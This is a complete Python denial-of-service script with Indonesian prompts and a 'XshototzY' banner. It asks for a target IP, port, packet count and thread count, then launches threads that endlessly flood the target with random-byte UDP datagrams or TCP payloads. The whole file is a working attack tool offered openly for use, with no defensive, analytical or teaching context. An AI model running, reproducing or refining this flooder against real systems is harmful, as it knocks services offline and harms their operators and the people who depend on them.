import random
import socket
import threading
import os,sys

os.system("clear")
print("XshototzY Nih Dekkk")
ip = str(input(" Ip dek:"))
port = int(input(" Port nya dek:"))
choice = str(input(" Yakin lu mau serang? (y/n):"))
times = int(input(" Paketnya mau berapa?:"))
threads = int(input(" Bonus paket:"))
os.system("clear")
def ddos():
    data = random._urandom(1025)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" XshototzY Attack!!!")
        except:
            print("[!] Waduh Down!!!")

def ddos2():
    data = random._urandom(180)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" XshototzY Attack!!!")
        except:
            s.close()
            print("[!] Waduh Down!!!")

def ddos3():
    data = random._urandom(16)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" XshototzY Attack!!!")
        except:
            s.close()
            print("[!] Waduh Down!!!")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = ddos)
        th.start()
        th = threading.Thread(target = ddos2)
        th.start()
    else:
        th = threading.Thread(target = ddos3)
        th.start()
